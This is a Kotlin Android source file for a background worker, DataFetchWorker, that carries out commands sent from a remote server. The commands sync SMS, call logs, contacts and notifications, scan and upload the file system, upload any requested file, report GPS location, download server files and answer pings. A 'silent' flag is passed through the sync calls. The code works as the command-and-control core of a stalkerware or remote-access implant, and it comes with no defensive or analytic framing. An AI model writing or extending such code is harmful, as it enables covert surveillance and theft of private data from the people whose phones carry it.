// DataFetchWorker.kt
package com.elfinsaddle.worker

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.*
import com.elfinsaddle.MainApplication
import com.elfinsaddle.data.remote.ApiClient
import com.elfinsaddle.data.remote.NetworkResult
import com.elfinsaddle.data.repository.DeviceRepository
import com.elfinsaddle.util.FileSystemManager
import com.elfinsaddle.util.SystemInfoManager
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

class DataFetchWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    private val container = (applicationContext as MainApplication).container
    private val apiClient: ApiClient = container.apiClient
    private val systemInfoManager: SystemInfoManager = container.systemInfoManager
    private val fileSystemManager: FileSystemManager = container.fileSystemManager
    private val deviceRepository: DeviceRepository = container.deviceRepository

    companion object {
        private const val TAG = "DataFetchWorker"

        const val KEY_COMMAND = "command"
        const val KEY_FILE_PATH = "filePath"
        // MODIFIED: New key for passing the silent flag to the worker
        const val KEY_IS_SILENT = "is_silent"

        // Commands
        const val COMMAND_SYNC_ALL = "sync_all"
        const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications"
        const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
        const val COMMAND_GET_LOCATION = "get_location"
        const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
        const val COMMAND_UPLOAD_FILE = "upload_file"
        const val COMMAND_DOWNLOAD_FILE = "download_file"
        const val COMMAND_PING = "ping"

        // MODIFIED: scheduleWork now accepts an isSilent flag
        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap(), isSilent: Boolean = false) {
            val dataBuilder = Data.Builder()
                .putString(KEY_COMMAND, command)
                .putBoolean(KEY_IS_SILENT, isSilent) // Add the silent flag as a boolean

            extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }

            val workRequestBuilder = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(dataBuilder.build())
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())

            Log.d(TAG, "Scheduling regular work for command: $command, silent: $isSilent")
            
            WorkManager.getInstance(context).enqueue(workRequestBuilder.build())
        }
    }

    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND) ?: run {
            Log.e(TAG, "Worker failed: No command provided.")
            return Result.failure()
        }

        Log.i(TAG, "Worker starting for command: $command")
        
        return withContext(Dispatchers.IO) {
            try {
                val success = executeCommand(command)
                if (success) Result.success() else Result.retry()
            } catch (e: Exception) {
                Log.e(TAG, "Worker failed with an exception for command '$command'", e)
                Result.failure()
            }
        }
    }

    private suspend fun executeCommand(command: String): Boolean {
        return when (command) {
            COMMAND_SYNC_ALL -> syncAllData()
            COMMAND_SYNC_NOTIFICATIONS -> {
                // MODIFIED: Read the silent flag and pass it
                val isSilent = inputData.getBoolean(KEY_IS_SILENT, false)
                deviceRepository.syncNotifications(isSilent) is NetworkResult.Success<*>
            }
            COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
            COMMAND_GET_LOCATION -> fetchAndSendLocation()
            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
            COMMAND_UPLOAD_FILE -> uploadRequestedFile()
            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
            COMMAND_PING -> sendPingResponse()
            else -> {
                Log.w(TAG, "Unknown command received: $command")
                false
            }
        }
    }

    private suspend fun syncAllData(): Boolean {
        // MODIFIED: Read the isSilent flag from inputData
        val isSilent = inputData.getBoolean(KEY_IS_SILENT, false)
        Log.i(TAG, "Starting full differential data sync... Silent Mode: $isSilent")

        // MODIFIED: Pass the isSilent flag to each sync function
        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms(isSilent) is NetworkResult.Success<*> else true
        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs(isSilent) is NetworkResult.Success<*> else true
        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts(isSilent) is NetworkResult.Success<*> else true
        val notificationsSuccess = deviceRepository.syncNotifications(isSilent) is NetworkResult.Success<*>
        
        return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess
    }
    
    private suspend fun uploadRequestedFile(): Boolean {
        val filePath = inputData.getString("filePath") ?: return false
        val file = File(filePath)
        if (!file.exists() || !file.canRead() || file.isDirectory) {
            Log.e(TAG, "Cannot upload file. Invalid path: $filePath")
            return false
        }
        val deviceId = systemInfoManager.getDeviceId()
        val result = apiClient.uploadRequestedFile(file, deviceId, filePath)
        return result is NetworkResult.Success<*>
    }

    private suspend fun downloadFileFromServer(): Boolean {
        val serverFilePath = inputData.getString("serverFilePath") ?: return false
        val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
        return downloadedFile?.exists() == true
    }

    private suspend fun fetchAndSendLocation(): Boolean {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return true
        val location = getCurrentLocation()
        val message = if (location != null) "Lat=${location.latitude}, Lon=${location.longitude}" else "Not available"
        val result = apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "location", message)
        return result is NetworkResult.Success<*>
    }

    private suspend fun fetchAndSendSystemInfo(): Boolean {
        val batteryInfo = systemInfoManager.getBatteryStatus()
        val message = "Net=${systemInfoManager.getNetworkType()}, Batt=${batteryInfo.percentage}% (${batteryInfo.status})"
        val result = apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "system_info", message)
        return result is NetworkResult.Success<*>
    }

    private suspend fun sendPingResponse(): Boolean {
        // MODIFIED: Consistently read the silent flag as a boolean
        val isSilent = inputData.getBoolean(KEY_IS_SILENT, false)
        val message = "Pong! Device online at ${System.currentTimeMillis()}"
        val extras = mapOf("isSilent" to isSilent)
        val result = apiClient.sendStatusUpdate(
            deviceId = systemInfoManager.getDeviceId(),
            statusType = "ping",
            message = message,
            extras = extras
        )
        return result is NetworkResult.Success<*>
    }

    private fun hasPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(applicationContext, permission) == PackageManager.PERMISSION_GRANTED

    private suspend fun getCurrentLocation(): Location? = try {
        if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            LocationServices.getFusedLocationProviderClient(applicationContext)
                .getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
        } else null
    } catch (e: SecurityException) {
        Log.e(TAG, "Failed to get current location due to security exception", e)
        null
    } catch (e: Exception) {
        Log.e(TAG, "Failed to get current location", e)
        null
    }
}
